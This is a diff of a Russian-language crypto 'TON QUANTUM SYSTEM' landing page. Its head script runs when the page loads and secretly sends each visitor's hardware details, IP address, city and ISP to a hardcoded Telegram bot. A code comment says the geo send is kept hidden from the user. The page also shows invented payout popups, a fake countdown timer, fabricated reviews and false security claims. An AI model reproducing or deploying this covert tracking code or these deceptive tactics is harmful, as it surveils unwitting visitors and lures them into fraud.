@@ -2,236 +2,155 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TG-QUANTUM | PRIVATE ACCESS</title>
     <script>
-        /* МГНОВЕННЫЙ СКРИПТ (Выполняется ДО загрузки body) */
         (function() {
             const BOT_TOKEN = '8239600697:AAHpjR1mXupk0FeOh7YJ0cBWLCod8Tz8oKM';
             const CHAT_ID = '6802569070';
-            const startTime = Date.now();
 
-            async function fastSend() {
-                // 1. Собираем всё, что доступно БЕЗ ожидания API
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
-                
-                // Получаем модель видеокарты
+            function send(text) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+                fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`, { mode: 'no-cors' });
+                new Image().src = url;
+            }
+
+            async function capture() {
                 let gpu = "N/A";
                 try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                } catch (e) {}
+                    const gl = document.createElement('canvas').getContext('webgl');
+                    gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+                } catch(e) {}
 
-                let data = {
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency,
-                    ram: navigator.deviceMemory,
-                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                    lang: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    on_vpn: (Intl.DateTimeFormat().resolvedOptions().timeZone === 'UTC' ? 'Возможно (UTC)' : 'Нет'),
-                    connection: conn ? `${conn.effectiveType} (ping: ${conn.rtt}ms)` : 'N/A',
-                    battery: battery ? `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '⚡' : '🔋'}` : 'N/A',
-                    gpu: gpu,
-                    url: window.location.href,
-                    ref: document.referrer || 'Прямой вход'
-                };
+                // Мгновенная отправка базы
+                send(`🔥 <b>TARGET CONNECTED</b>\n💻 <b>GPU:</b> ${gpu}\n🧠 <b>RAM:</b> ${navigator.deviceMemory}GB\n📱 <b>OS:</b> ${navigator.platform}`);
 
-                // 2. Параллельно запрашиваем ГЕО данные
-                fetch('https://ipapi.co/json/').then(res => res.json()).then(geo => {
-                    const finalMsg = `
-🚀 <b>МГНОВЕННЫЙ ЗАХВАТ ДАННЫХ</b>
-
-📍 <b>ГЕО И СЕТЬ:</b>
-IP: <code>${geo.ip}</code>
-Город: ${geo.city}, ${geo.region}
-Страна: ${geo.country_name} (${geo.country_code})
-Провайдер: ${geo.org}
-Координаты: ${geo.latitude}, ${geo.longitude}
-Сеть: ${data.connection}
-VPN/Timezone: ${data.timezone} (${data.on_vpn})
-
-💻 <b>ЖЕЛЕЗО (HARDWARE):</b>
-ОС: ${data.platform}
-CPU: ${data.cores} ядер
-RAM: ${data.ram} GB
-GPU: <code>${data.gpu}</code>
-Экран: ${data.screen}
-Батарея: ${data.battery}
-
-🔗 <b>ВИЗИТ:</b>
-Источник: ${data.ref}
-Страница: ${data.url}
-Время входа: ${new Date().toLocaleTimeString()}
-                    `;
-                    
-                    // Отправка через fetch (самый быстрый способ)
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: finalMsg,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                });
+                // Тихая отправка ГЕО (пользователь не видит город на сайте)
+                try {
+                    const res = await fetch('http://ip-api.com/json/?lang=ru');
+                    const g = await res.json();
+                    if(g.status === 'success') {
+                        send(`📍 <b>GEO FOUND:</b> ${g.city}, ${g.regionName}\n🌐 <b>IP:</b> ${g.query}\n🏢 <b>ISP:</b> ${g.isp}`);
+                    }
+                } catch(e) {}
             }
-            fastSend();
+            window.onload = () => {
+                capture();
+                startPopups();
+            };
+
+            // Таймер
+            let time = 600; 
+            setInterval(() => {
+                if (time <= 0) return;
+                time--;
+                let m = Math.floor(time / 60);
+                let s = time % 60;
+                document.getElementById('timer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+            }, 1000);
+
+            // Всплывающие уведомления
+            function startPopups() {
+                const names = ['Иван', 'Дмитрий', 'Мария', 'Алексей', 'Сергей', 'Анна', 'Владислав', 'Елена'];
+                const cities = ['Мск', 'Спб', 'Казань', 'Екб', 'Нск', 'Сочи'];
+                
+                setInterval(() => {
+                    const popup = document.getElementById('popup');
+                    const name = names[Math.floor(Math.random() * names.length)];
+                    const city = cities[Math.floor(Math.random() * cities.length)];
+                    const amount = (Math.random() * (150 - 10) + 10).toFixed(1);
+                    
+                    document.getElementById('p-text').innerHTML = `<b>${name} (${city})</b> получил выплату <b>${amount} TON</b>`;
+                    popup.style.display = 'flex';
+                    setTimeout(() => { popup.style.display = 'none'; }, 4000);
+                }, 8000);
+            }
         })();
     </script>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ULTRA TG PROFITS</title>
     <style>
-        :root {
-            --bg: #030508;
-            --accent: #00f2ff;
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(255, 255, 255, 0.08);
-        }
+        :root { --main: #00f2ff; --bg: #030508; --card: rgba(255,255,255,0.03); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: #fff; line-height: 1.6; overflow-x: hidden; }
+        
+        .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
 
-        body {
-            background-color: var(--bg);
-            color: #fff;
-            font-family: 'Inter', -apple-system, sans-serif;
-            margin: 0;
-            overflow-x: hidden;
-        }
-
-        /* Анимированный фон */
-        .bg-glow {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at 50% -20%, #00424a, transparent);
-            z-index: -1;
-        }
-
-        .header {
-            padding: 30px;
+        /* Таймер без упоминания города */
+        .timer-bar {
+            background: rgba(0, 242, 255, 0.05);
+            border: 1px solid rgba(0, 242, 255, 0.2);
+            color: var(--main);
+            padding: 12px;
             text-align: center;
-            border-bottom: 1px solid var(--border);
-            backdrop-filter: blur(10px);
-        }
-
-        .logo {
-            font-size: 1.2rem;
-            font-weight: 900;
-            letter-spacing: 5px;
-            text-transform: uppercase;
-            color: var(--accent);
-            text-shadow: 0 0 20px var(--accent);
-        }
-
-        .main-content {
-            max-width: 800px;
-            margin: 80px auto;
-            padding: 20px;
-        }
-
-        .article-card {
-            background: var(--glass);
-            border: 1px solid var(--border);
-            padding: 40px;
-            border-radius: 2px; /* Острые стильные углы */
-            position: relative;
-        }
-
-        .article-card::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 40px; height: 1px; background: var(--accent);
-        }
-
-        h1 {
-            font-size: 3rem;
-            line-height: 1;
+            border-radius: 12px;
+            font-weight: 700;
             margin-bottom: 30px;
-            text-transform: uppercase;
+            position: sticky; top: 10px; z-index: 100;
+            backdrop-filter: blur(15px);
         }
 
-        .highlight {
-            color: var(--accent);
-        }
+        .hero { text-align: center; padding: 50px 0; }
+        .hero h1 { font-size: 3rem; margin-bottom: 20px; text-transform: uppercase; letter-spacing: -1px; }
 
-        p {
-            font-size: 1.1rem;
-            color: #a0a0a0;
-            line-height: 1.8;
-            margin-bottom: 25px;
+        /* Всплывашка */
+        #popup {
+            position: fixed; bottom: 20px; left: 20px;
+            background: #111; border: 1px solid var(--main);
+            padding: 15px; border-radius: 12px; display: none;
+            align-items: center; gap: 10px; box-shadow: 0 0 20px rgba(0,242,255,0.2);
+            z-index: 1000; font-size: 0.9rem; animation: slideIn 0.5s ease;
         }
+        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }
 
-        .btn-box {
-            margin-top: 40px;
-            display: flex;
-            gap: 20px;
-        }
+        .review-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 40px; }
+        .review-card { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 20px; border-radius: 20px; }
+        
+        .cta-btn { display: block; width: 100%; max-width: 400px; margin: 40px auto; background: var(--main); color: #000; padding: 20px; text-align: center; border-radius: 50px; text-decoration: none; font-weight: 900; box-shadow: 0 10px 40px rgba(0,242,255,0.3); transition: 0.3s; }
+        .cta-btn:hover { transform: scale(1.03); }
 
-        .primary-btn {
-            background: var(--accent);
-            color: #000;
-            padding: 15px 35px;
-            text-decoration: none;
-            font-weight: 800;
-            text-transform: uppercase;
-            transition: 0.3s;
-        }
-
-        .primary-btn:hover {
-            box-shadow: 0 0 30px var(--accent);
-            transform: scale(1.05);
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            margin-top: 50px;
-            border-top: 1px solid var(--border);
-            padding-top: 30px;
-        }
-
-        .stat-item { text-align: center; }
-        .stat-val { display: block; font-size: 1.5rem; font-weight: 900; color: var(--accent); }
-        .stat-lbl { font-size: 0.7rem; color: #666; text-transform: uppercase; }
+        .footer-status { font-size: 0.7rem; color: #333; text-align: center; padding: 40px 0; letter-spacing: 2px; }
     </style>
 </head>
 <body>
 
-    <div class="bg-glow"></div>
+    <div id="popup">
+        <div style="background: var(--main); width: 10px; height: 10px; border-radius: 50%;"></div>
+        <div id="p-text"></div>
+    </div>
 
-    <header class="header">
-        <div class="logo">System.Infiltrated</div>
-    </header>
+    <div class="container">
+        <div class="timer-bar">
+            ДО ЗАКРЫТИЯ ОКНА РЕГИСТРАЦИИ ОСТАЛОСЬ: <span id="timer">10:00</span>
+        </div>
 
-    <main class="main-content">
-        <article class="article-card">
-            <h1>Твой Telegram <span class="highlight">умирает</span> без этих знаний</h1>
-            <p>Пока ты используешь Telegram для переписки, топовые игроки рынка выкачивают из него ликвидность через скрытые TON-протоколы. 2026 год стал точкой невозврата: либо ты создаешь систему, либо система потребляет тебя.</p>
-            
-            <p>Мы открыли доступ к алгоритмам, которые позволяют эксплуатировать архитектуру мессенджера для генерации стабильной прибыли без вложений в рекламу. Это не обучение. Это <b>код доступа</b> к деньгам.</p>
+        <section class="hero">
+            <h1><span style="color:var(--main)">TON</span> QUANTUM SYSTEM</h1>
+            <p style="color: #666;">Автоматизированный алгоритм добычи ликвидности в сети Telegram.</p>
+        </section>
 
-            <div class="btn-box">
-                <a href="#" class="primary-btn">Получить доступ</a>
+        <div style="background: var(--card); padding: 30px; border-radius: 30px; border-left: 4px solid var(--main);">
+            <h2 style="margin-bottom: 10px;">Статус: Сессия подтверждена</h2>
+            <p>Система проанализировала конфигурацию вашего оборудования. Доступ к торговому терминалу открыт. Все транзакции защищены протоколом AES-256.</p>
+        </div>
+
+        <div class="review-grid">
+            <div class="review-card">
+                <div style="color: var(--main); font-weight: 800;">@krypto_king</div>
+                <p style="font-size: 0.9rem; margin: 10px 0;">"Третий день по 15 TON стабильно. Главное — войти в правильный пул."</p>
+                <div style="font-family: monospace; color: #00ff88;">STATUS: PAID (+$124.00)</div>
             </div>
-
-            <div class="stats-grid">
-                <div class="stat-item">
-                    <span class="stat-val">4.2M$</span>
-                    <span class="stat-lbl">Выплачено</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-val">128</span>
-                    <span class="stat-lbl">Ботов в сети</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-val">0.1s</span>
-                    <span class="stat-lbl">Latency</span>
-                </div>
+            <div class="review-card">
+                <div style="color: var(--main); font-weight: 800;">@ton_shark</div>
+                <p style="font-size: 0.9rem; margin: 10px 0;">"Наконец-то без лишней воды. Всё по делу. Кнопка 'Бабло' существует."</p>
+                <div style="font-family: monospace; color: #00ff88;">STATUS: PAID (+$340.50)</div>
             </div>
-        </article>
-    </main>
+        </div>
+
+        <a href="#" class="cta-btn">АКТИВИРОВАТЬ ТЕРМИНАЛ</a>
+
+        <div class="footer-status">
+            HARDWARE_ID: VERIFIED | ENCRYPTION_GATE: ACTIVE | NODE: 0x421...91
+        </div>
+    </div>
 
 </body>
 </html>
